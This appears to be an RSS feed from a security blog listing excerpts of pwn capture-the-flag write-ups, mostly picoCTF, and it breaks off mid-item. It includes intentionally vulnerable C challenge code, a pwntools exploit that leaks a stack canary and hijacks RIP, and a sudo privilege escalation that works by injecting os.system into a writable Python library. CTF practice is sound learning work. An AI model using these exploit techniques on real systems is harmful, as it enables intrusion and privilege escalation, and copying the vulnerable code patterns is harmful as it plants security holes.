<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PWN :: Tag :: SBK Hugo Site</title><link>https://bernie6401.github.io/tags/pwn/index.html</link><description/><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tags/pwn/index.xml" rel="self" type="application/rss+xml"/><item><title>NTU CS 2023 HW3 Write Up</title><link>https://bernie6401.github.io/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/index.html</guid><description>NTU CS 2023 HW3 Write Up Lab-Stackoverflow Flag: flag{Y0u_know_hoW2L3@k_canAry}
解題流程與思路 這一題就是前一年的Leak Canary的應用版，當時是用pwndbg，還不知道gef的偉大，總之這一題的思路就是:
接收開shell的function的address(win function) 接收0x20個bytes，分別代表RSP value/Stack Canary/RBP value/RIP 傳送payload過去，分別是p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) 這樣就可以蓋到RIP後又不會被偵測到canary被改變，return之後拿到shell :::info 比較值得注意的是，因為我是在公布解答前先自己寫，遇到了return之後拿不到shell的問題，後來經過助教的解釋才知道原來是，開shell的過程中&lt;do_system+115> movaps XMMWORD PTR [rsp], xmm1，RSP必須要是對齊的狀態，也就是最後應該要是0，但可以看下圖，如果直接跳到win function的開頭，rsp就不是0，會偏移8 bytes，所以會出現SIGSEGV 解決方式有兩個，一個是少push一次，一個是多pop一次，這樣就可以校正RSP回到0結尾的狀態，所以我們才要在RIP的地方加上(0xf1-0xe9)的offset，讓RIP可以少push一次，這樣就可以解決問題 :::
Exploit - Leak Canary + Control RIP from pwn import * # r = process('./lab') r = remote('10.113.184.121', 10041) r.recvuntil(b'Gift: 0x') win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9) r.recvuntil(b'Gift2: ') rsp_val = u64(r.recv(0x8)) stack_canary = u64(r.recv(0x8)) rbp_val = u64(r.recv(0x8)) rip = u64(r.recv(0x8)) log.info(f'win address = {hex(win_addr)}') log.info(f'RSP value = {hex(rsp_val)}') log.info(f'Stack Canary = {hex(stack_canary)}') log.info(f'RBP value = {hex(rbp_val)}') log.info(f'RIP value = {hex(rip)}') payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr) log.info(f'Payload = {payload}') # raw_input() r.sendline(payload) r.interactive() Lab-Shellcode Flag: flag{How_you_do0o0o0o_sysca1111111}</description></item><item><title>PicoCTF - babygame01</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame01/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame01/index.html</guid><description>PicoCTF - babygame01 Background Bof
Description &amp; Hint Get the flag and reach the exit. Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you’ll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 50227. Hint 1: Use ‘w’,‘a’,’s’,’d’ to move around. Hint 2: There may be secret commands to make your life easy.</description></item><item><title>PicoCTF - babygame02</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame02/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---babygame02/index.html</guid><description>PicoCTF - babygame02 Source :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { int position[2]; // [esp+0h] [ebp-AA0h] BYREF char map[2700]; // [esp+Bh] [ebp-A95h] BYREF char input; // [esp+A97h] [ebp-9h] int *p_argc; // [esp+A98h] [ebp-8h] p_argc = &amp;argc; init_player(position); init_map(map, position); print_map(map); signal(2, sigint_handler); do { do { input = getchar(); move_player(position, input, map); print_map(map); } while ( position[0] != 29 ); // y座標 } while ( position[1] != 89 ); // x座標 puts("You win!"); return 0; } ::: :::spoiler IDA Win Function</description></item><item><title>PicoCTF - buffer overflow 2</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---buffer-overflow-2/index.html</guid><description>PicoCTF - buffer overflow 2 Background Bof
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #define BUFSIZE 100 #define FLAGSIZE 64 void win(unsigned int arg1, unsigned int arg2) { char buf[FLAGSIZE]; FILE *f = fopen("flag.txt","r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf,FLAGSIZE,f); if (arg1 != 0xCAFEF00D) return; if (arg2 != 0xF00DF00D) return; printf(buf); } void vuln(){ char buf[BUFSIZE]; gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts("Please enter your string: "); vuln(); return 0; } :::</description></item><item><title>PicoCTF - fermat-strings</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---fermat-strings/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---fermat-strings/index.html</guid><description>PicoCTF - fermat-strings Background C 庫函數 - strcspn()
該函數返回 str1 開頭連續都不含字符串 str2 中字符的字符數。
atoi() - C語言庫函數
這個函數返回一個int值轉換的整數。如果冇有有效的轉換可以執行，它返回零。
C 库函数 - snprintf()
snprintf() 函數的返回值是輸出到 str 緩沖區中的字符數，不包括字符串結尾的空字符 \0。如果 snprintf() 輸出的字符數超過了 size 參數指定的緩沖區大小，則輸出的結果會被截斷，只有 size - 1 個字符被寫入緩沖區，最後一個字符為字符串結尾的空字符 \0。
需要注意的是，snprintf() 函數返回的字符數並不包括字符串結尾的空字符 \0，因此如果需要將輸出結果作為一個字符串使用，則需要在緩沖區的末尾添加一個空字符 \0。
Format Specifiers in C
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;math.h> #define SIZE 0x100 int main(void) { char A[SIZE]; char B[SIZE]; int a = 0; int b = 0; puts("Welcome to Fermat\\'s Last Theorem as a service"); setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); printf("A: "); read(0, A, SIZE); printf("B: "); read(0, B, SIZE); A[strcspn(A, "\n")] = 0; B[strcspn(B, "\n")] = 0; a = atoi(A); b = atoi(B); if(a == 0 || b == 0) { puts("Error: could not parse numbers!"); return 1; } char buffer[SIZE]; snprintf(buffer, SIZE, "Calculating for A: %s and B: %s\n", A, B); printf(buffer); int answer = -1; for(int i = 0; i &lt; 100; i++) { if(pow(a, 3) + pow(b, 3) == pow(i, 3)) { answer = i; } } if(answer != -1) printf("Found the answer: %d\n", answer); } :::</description></item><item><title>PicoCTF - filtered-shellcode</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---filtered-shellcode/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---filtered-shellcode/index.html</guid><description>PicoCTF - filtered-shellcode Background Shell Code Reverse
Source code :::spoiler Source Code Got From Server After Get Shell
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #define MAX_LENGTH 1000 void execute(char *shellcode, size_t length) { if (!shellcode || !length) { exit(1); } size_t new_length = length * 2; char result[new_length + 1]; int spot = 0; for (int i = 0; i &lt; new_length; i++) { if ((i % 4) &lt; 2) { result[i] = shellcode[spot++]; } else { result[i] = '\x90'; } } // result[new_length] = '\xcc'; result[new_length] = '\xc3'; // Execute code int (*code)() = (int(*)())result; code(); } int main(int argc, char *argv[]) { setbuf(stdout, NULL); char buf[MAX_LENGTH]; size_t length = 0; char c = '\0'; printf("Give me code to run:\n"); c = fgetc(stdin); while ((c != '\n') &amp;&amp; (length &lt; MAX_LENGTH)) { buf[length] = c; c = fgetc(stdin); length++; } if (length % 2) { buf[length] = '\x90'; length++; } execute(buf, length); return 0; } :::</description></item><item><title>PicoCTF - flag leak</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---flag-leak/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---flag-leak/index.html</guid><description>PicoCTF - flag leak Background Format String Bug Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;wchar.h> #include &lt;locale.h> #define BUFSIZE 64 #define FLAGSIZE 64 void readflag(char* buf, size_t len) { FILE *f = fopen("flag.txt","r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf,len,f); // size bound read } void vuln(){ char flag[BUFSIZE]; char story[128]; readflag(flag, FLAGSIZE); printf("Tell me a story and then I'll tell you one >> "); scanf("%127s", story); printf("Here's a story - \n"); printf(story); printf("\n"); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); return 0; } :::</description></item><item><title>PicoCTF - function overwrite</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---function-overwrite/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---function-overwrite/index.html</guid><description>PicoCTF - function overwrite Background Array Bound
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;wchar.h> #include &lt;locale.h> #define BUFSIZE 64 #define FLAGSIZE 64 int calculate_story_score(char *story, size_t len) { int score = 0; for (size_t i = 0; i &lt; len; i++) { score += story[i]; } return score; } void easy_checker(char *story, size_t len) { if (calculate_story_score(story, len) == 1337) { char buf[FLAGSIZE] = {0}; FILE *f = fopen("flag.txt", "r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf, FLAGSIZE, f); // size bound read printf("You're 1337. Here's the flag.\n"); printf("%s\n", buf); } else { printf("You've failed this class."); } } void hard_checker(char *story, size_t len) { if (calculate_story_score(story, len) == 13371337) { char buf[FLAGSIZE] = {0}; FILE *f = fopen("flag.txt", "r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf, FLAGSIZE, f); // size bound read printf("You're 13371337. Here's the flag.\n"); printf("%s\n", buf); } else { printf("You've failed this class."); } } void (*check)(char*, size_t) = hard_checker; int fun[10] = {0}; void vuln() { char story[128]; int num1, num2; printf("Tell me a story and then I'll tell you if you're a 1337 >> "); scanf("%127s", story); printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n"); scanf("%d %d", &amp;num1, &amp;num2); if (num1 &lt; 10) { fun[num1] += num2; } check(story, strlen(story)); } int main(int argc, char **argv) { setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); return 0; } :::</description></item><item><title>PicoCTF - Guessing Game 1</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-1/index.html</guid><description>PicoCTF - Guessing Game 1 Background ROP Chain Linux System Call Table for x86 64
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #define BUFSIZE 100 long increment(long in) { return in + 1; } long get_random() { return rand() % BUFSIZE; } int do_stuff() { long ans = get_random(); ans = increment(ans); int res = 0; printf("What number would you like to guess?\n"); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf("That's not a valid number!\n"); } else { if (g == ans) { printf("Congrats! You win! Your prize is this print statement!\n\n"); res = 1; } else { printf("Nope!\n\n"); } } return res; } void win() { char winner[BUFSIZE]; printf("New winner!\nName? "); fgets(winner, 360, stdin); printf("Congrats %s\n\n", winner); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf("Welcome to my guessing game!\n\n"); while (1) { res = do_stuff(); if (res) { win(); } } return 0; } :::</description></item><item><title>PicoCTF - Guessing Game 2</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---guessing-game-2/index.html</guid><description>PicoCTF - Guessing Game 2 Background fmt / leak libc / ret2libc / leak canary
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;sys/stat.h> #define BUFSIZE 512 long get_random() { return rand; } int get_version() { return 2; } // void print(long n) // { // // If number is smaller than 0, put a - sign // // and change number to positive // if (n &lt; 0) { // putchar('-'); // n = -n; // } // // Remove the last digit and recur // if (n/10) // print(n/10); // // Print the last digit // putchar(n%10 + '0'); // } int do_stuff() { long ans = (get_random() % 4096) + 1; // print(ans); int res = 0; printf("What number would you like to guess?\n"); char guess[BUFSIZE]; fgets(guess, BUFSIZE, stdin); long g = atol(guess); if (!g) { printf("That's not a valid number!\n"); } else { if (g == ans) { printf("Congrats! You win! Your prize is this print statement!\n\n"); res = 1; } else { printf("Nope!\n\n"); } } return res; } void win() { char winner[BUFSIZE]; printf("New winner!\nName? "); gets(winner); printf("Congrats: "); printf(winner); printf("\n\n"); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); int res; printf("Welcome to my guessing game!\n"); printf("Version: %x\n\n", get_version()); while (1) { res = do_stuff(); if (res) { win(); } } return 0; } :::</description></item><item><title>PicoCTF - hijacking</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---hijacking/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---hijacking/index.html</guid><description>PicoCTF - hijacking Background Privilege Escalation
Hint 1: Check for Hidden files Hint 2: No place like Home:)
Linux sudo命令
-l 顯示出自己（執行 sudo 的使用者）的權限
Recon 第一次遇到提權的問題，感覺很新鮮也很好玩，不過因為沒啥概念所以主要是參考1
首先觀察一下各個file或folders，根目錄有個challenge folder，另外家目錄有一個.server.py檔案，裡面的內容不太重要，只需要知道他import哪些library 現在的問題是按照目前的權限，無法讀取challenge相關的資訊，所以我們要提升權限，主要的做法是利用base64.py這個mod全開的檔案進行讀寫，再利用python執行有import base64的.server.py檔案就可以執行shell 為神麼要用base64.py當作主要的突破口就是因為只有他的mod全開 $ ls -al /usr/lib/python3.8 ... -rwxrwxrwx 1 root root 20382 Nov 14 2022 base64.py ... -rw-r--r-- 1 root root 38995 Nov 14 2022 os.py ... -rw-r--r-- 1 root root 35243 Nov 14 2022 socket.py Exploit $ ssh picoctf@saturn.picoctf.net -p 58219 $ find / -name "base64.py" ... /usr/lib/python3.8/base64.py ... $ vim /usr/lib/python3.8/base64.py # add these line and save the file import os os.system('ls -al /challenge') $ sudo -l Matching Defaults entries for picoctf on challenge: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User picoctf may run the following commands on challenge: (ALL) /usr/bin/vi (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py $ sudo /usr/bin/python3 /home/picoctf/.server.py total 4 d--------- 1 root root 6 Mar 16 02:08 . drwxr-xr-x 1 root root 51 Jul 31 15:23 .. -rw-r--r-- 1 root root 103 Mar 16 02:08 metadata.json sh: 1: ping: not found Traceback (most recent call last): File "/home/picoctf/.server.py", line 7, in &lt;module> host_info = socket.gethostbyaddr(ip) socket.gaierror: [Errno -5] No address associated with hostname $ vim /usr/lib/python3.8/base64.py # revise the file os.system('cat /challegne/metadata.json') $ sudo /usr/bin/python3 /home/picoctf/.server.py {"flag": "picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}", "username": "picoctf", "password": "HYGhWsmPyf"}sh: 1: ping: not found Traceback (most recent call last): File "/home/picoctf/.server.py", line 7, in &lt;module> host_info = socket.gethostbyaddr(ip) socket.gaierror: [Errno -5] No address associated with hostname Flag: picoCTF{pYth0nn_libraryH!j@CK!n9_566dbbb7}</description></item><item><title>PicoCTF - Kit Engine</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---kit-engine/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---kit-engine/index.html</guid><description>PicoCTF - Kit Engine Background Google V8 Engine
V8 引擎是 Google 做出來讓 JS 跟瀏覽器溝通的的開源專案，這個引擎被使用的非常廣泛，在 Chrome 瀏覽器跟 Node.js ，以及桌面應用程式框架 Electron 之中都有他的身影。而在 V8 出現前，最早最早的 JavaScript 引擎，叫做 SpiderMonkey ，同時也是另一個知名瀏覽器 FireFox 的渲染引擎。
Using d8
d8 is V8’s own developer shell.
d8 is useful for running some JavaScript locally or debugging changes you have made to V8. Building V8 using GN for x64 outputs a d8 binary in out.gn/x64.optdebug/d8. You can call d8 with the –help argument for more information about usage and flags.</description></item><item><title>PicoCTF - ropfu</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---ropfu/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---ropfu/index.html</guid><description>PicoCTF - ropfu Background ROP Chain x86 Calling Convention: Linux System Call Table
Source code :::spoiler Source Code
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #define BUFSIZE 16 void vuln() { char buf[16]; printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n"); return gets(buf); } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); } :::</description></item><item><title>PicoCTF - RPS</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---rps/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---rps/index.html</guid><description>PicoCTF - RPS Background strstr() in C/C++
In C++, std::strstr() is a predefined function used for string handling. string.h is the header file required for string functions. This function takes two strings s1 and s2 as an argument and finds the first occurrence of the sub-string s2 in the string s1. The process of matching does not include the terminating null-characters(‘\0’), but function stops there. Syntax:
char *strstr (const char *s1, const char *s2); Parameters: s1: This is the main string to be examined. s2: This is the sub-string to be searched in s1 string. Return Value: This function returns a pointer points to the first character of the found s2 in s1 otherwise a null pointer if s2 is not present in s1. If s2 points to an empty string, s1 is returned.</description></item><item><title>PicoCTF - SaaS</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---saas/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---saas/index.html</guid><description>PicoCTF - SaaS Background seccomp-tool
Source code :::spoiler Source Code
#include &lt;errno.h> #include &lt;error.h> #include &lt;fcntl.h> #include &lt;seccomp.h> #include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;sys/mman.h> #include &lt;sys/syscall.h> #include &lt;unistd.h> #define SIZE 0x100 // http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=xor+rax%2C+rax%0D%0Amov+rdi%2C+rsp%0D%0Aand+rdi%2C+0xfffffffffffff000%0D%0Asub+rdi%2C+0x2000%0D%0Amov+rcx%2C+0x600%0D%0Arep+stosq%0D%0Axor+rbx%2C+rbx%0D%0Axor+rcx%2C+rcx%0D%0Axor+rdx%2C+rdx%0D%0Axor+rsp%2C+rsp%0D%0Axor+rbp%2C+rbp%0D%0Axor+rsi%2C+rsi%0D%0Axor+rdi%2C+rdi%0D%0Axor+r8%2C+r8%0D%0Axor+r9%2C+r9%0D%0Axor+r10%2C+r10%0D%0Axor+r11%2C+r11%0D%0Axor+r12%2C+r12%0D%0Axor+r13%2C+r13%0D%0Axor+r14%2C+r14%0D%0Axor+r15%2C+r15%0D%0A&amp;arch=x86-64&amp;as_format=inline#assembly #define HEADER "\x48\x31\xc0\x48\x89\xe7\x48\x81\xe7\x00\xf0\xff\xff\x48\x81\xef\x00\x20\x00\x00\x48\xc7\xc1\x00\x06\x00\x00\xf3\x48\xab\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xe4\x48\x31\xed\x48\x31\xf6\x48\x31\xff\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff" #define FLAG_SIZE 64 char flag[FLAG_SIZE]; void load_flag() { int fd; if ((fd = open("flag.txt", O_RDONLY)) == -1) error(EXIT_FAILURE, errno, "open flag"); if (read(fd, flag, FLAG_SIZE) == -1) error(EXIT_FAILURE, errno, "read flag"); if (close(fd) == -1) error(EXIT_FAILURE, errno, "close flag"); } void setup() { scmp_filter_ctx ctx; ctx = seccomp_init(SCMP_ACT_KILL); int ret = 0; if (ctx != NULL) { ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 1, SCMP_A0(SCMP_CMP_EQ, STDOUT_FILENO)); ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0); ret |= seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0); ret |= seccomp_load(ctx); } seccomp_release(ctx); if (ctx == NULL || ret) error(EXIT_FAILURE, 0, "seccomp"); } int main() { setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); load_flag(); puts("Welcome to Shellcode as a Service!"); void* addr = mmap(NULL, 0x1000, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); memcpy(addr, HEADER, sizeof(HEADER)); read(0, addr + sizeof(HEADER) - 1, SIZE); setup(); goto *addr; } :::</description></item><item><title>PicoCTF - seed-sPRiNG</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---seed-spring/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---seed-spring/index.html</guid><description>PicoCTF - seed-sPRiNG Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { int guess_height; // [esp+0h] [ebp-18h] BYREF int ans; // [esp+4h] [ebp-14h] unsigned int seed; // [esp+8h] [ebp-10h] int i; // [esp+Ch] [ebp-Ch] int *p_argc; // [esp+10h] [ebp-8h] p_argc = &amp;argc; puts(&amp;unk_A50); puts(&amp;unk_A50); puts(" "); puts(" # mmmmm mmmmm \" mm m mmm "); puts(" mmm mmm mmm mmm# mmm # \"# # \"# mmm #\"m # m\" \""); puts(" # \" #\" # #\" # #\" \"# # \" #mmm#\" #mmmm\" # # #m # # mm"); puts(" \"\"\"m #\"\"\"\" #\"\"\"\" # # \"\"\"m # # \"m # # # # # #"); puts(" \"mmm\" \"#mm\" \"#mm\" \"#m## \"mmm\" # # \" mm#mm # ## \"mmm\""); puts(" "); puts(&amp;unk_A50); puts(&amp;unk_A50); puts("Welcome! The game is easy: you jump on a sPRiNG."); puts("How high will you fly?"); puts(&amp;unk_A50); fflush(stdout); seed = time(0); srand(seed); for ( i = 1; i &lt;= 30; ++i ) { printf("LEVEL (%d/30)\n", i); puts(&amp;unk_A50); LOBYTE(ans) = rand() &amp; 0xF; ans = ans; printf("Guess the height: "); fflush(stdout); __isoc99_scanf("%d", &amp;guess_height); fflush(stdin); if ( ans != guess_height ) { puts("WRONG! Sorry, better luck next time!"); fflush(stdout); exit(-1); } } puts("Congratulation! You've won! Here is your flag:\n"); fflush(stdout); get_flag(); fflush(stdout); return 0; } :::</description></item><item><title>PicoCTF - stack cache</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stack-cache/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stack-cache/index.html</guid><description>PicoCTF - stack cache Background BoF
Source code :::spoiler
#include &lt;stdio.h> #include &lt;stdlib.h> #include &lt;string.h> #include &lt;unistd.h> #include &lt;sys/types.h> #include &lt;wchar.h> #include &lt;locale.h> #define BUFSIZE 16 #define FLAGSIZE 64 #define INPSIZE 10 /* This program is compiled statically with clang-12 without any optimisations. */ void win() { char buf[FLAGSIZE]; char filler[BUFSIZE]; FILE *f = fopen("flag.txt","r"); if (f == NULL) { printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n"); exit(0); } fgets(buf,FLAGSIZE,f); // size bound read } void UnderConstruction() { // this function is under construction char consideration[BUFSIZE]; char *demographic, *location, *identification, *session, *votes, *dependents; char *p,*q, *r; // *p = "Enter names"; // *q = "Name 1"; // *r = "Name 2"; unsigned long *age; printf("User information : %p %p %p %p %p %p\n",demographic, location, identification, session, votes, dependents); printf("Names of user: %p %p %p\n", p,q,r); printf("Age of user: %p\n",age); fflush(stdout); } void vuln(){ char buf[INPSIZE]; printf("Give me a string that gets you the flag\n"); gets(buf); printf("%s\n",buf); return; } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); printf("Bye!"); return 0; } :::</description></item><item><title>PicoCTF - Stonk Market</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stonk-market/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---stonk-market/index.html</guid><description>PicoCTF - Stonk Market Background FMT
Source code :::spoiler
#include &lt;stdlib.h> #include &lt;stdio.h> #include &lt;string.h> #include &lt;time.h> #define FLAG_BUFFER 128 #define MAX_SYM_LEN 4 typedef struct Stonks { int shares; char symbol[MAX_SYM_LEN + 1]; struct Stonks *next; } Stonk; typedef struct Portfolios { int money; Stonk *head; } Portfolio; int view_portfolio(Portfolio *p) { if (!p) { return 1; } printf("\nPortfolio as of "); fflush(stdout); system("date"); // TODO: implement this in C fflush(stdout); printf("\n\n"); Stonk *head = p->head; if (!head) { printf("You don't own any stonks!\n"); } while (head) { printf("%d shares of %s\n", head->shares, head->symbol); head = head->next; } return 0; } Stonk *pick_symbol_with_AI(int shares) { if (shares &lt; 1) { return NULL; } Stonk *stonk = malloc(sizeof(Stonk)); stonk->shares = shares; int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1; for (int i = 0; i &lt;= MAX_SYM_LEN; i++) { if (i &lt; AI_symbol_len) { stonk->symbol[i] = 'A' + (rand() % 26); } else { stonk->symbol[i] = '\0'; } } stonk->next = NULL; return stonk; } int buy_stonks(Portfolio *p) { if (!p) { return 1; } /* char api_buf[FLAG_BUFFER]; FILE *f = fopen("api","r"); if (!f) { printf("Flag file not found\n"); exit(1); } fgets(api_buf, FLAG_BUFFER, f); */ int money = p->money; int shares = 0; Stonk *temp = NULL; printf("Using patented AI algorithms to buy stonks\n"); while (money > 0) { shares = (rand() % money) + 1; temp = pick_symbol_with_AI(shares); temp->next = p->head; p->head = temp; money -= shares; } printf("Stonks chosen\n"); char *user_buf = malloc(300 + 1); printf("What is your API token?\n"); scanf("%300s", user_buf); printf("Buying stonks with token:\n"); printf(user_buf); // TODO: Actually use key to interact with API view_portfolio(p); return 0; } Portfolio *initialize_portfolio() { Portfolio *p = malloc(sizeof(Portfolio)); p->money = (rand() % 2018) + 1; p->head = NULL; return p; } void free_portfolio(Portfolio *p) { Stonk *current = p->head; Stonk *next = NULL; while (current) { next = current->next; free(current); current = next; } free(p); } int main(int argc, char *argv[]) { setbuf(stdout, NULL); srand(time(NULL)); Portfolio *p = initialize_portfolio(); if (!p) { printf("Memory failure\n"); exit(1); } int resp = 0; printf("Welcome back to the trading app!\n\n"); printf("What would you like to do?\n"); printf("1) Buy some stonks!\n"); printf("2) View my portfolio\n"); scanf("%d", &amp;resp); if (resp == 1) { buy_stonks(p); } else if (resp == 2) { view_portfolio(p); } free_portfolio(p); printf("Goodbye!\n"); exit(0); } :::</description></item><item><title>PicoCTF - tic-tac</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---tic-tac/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 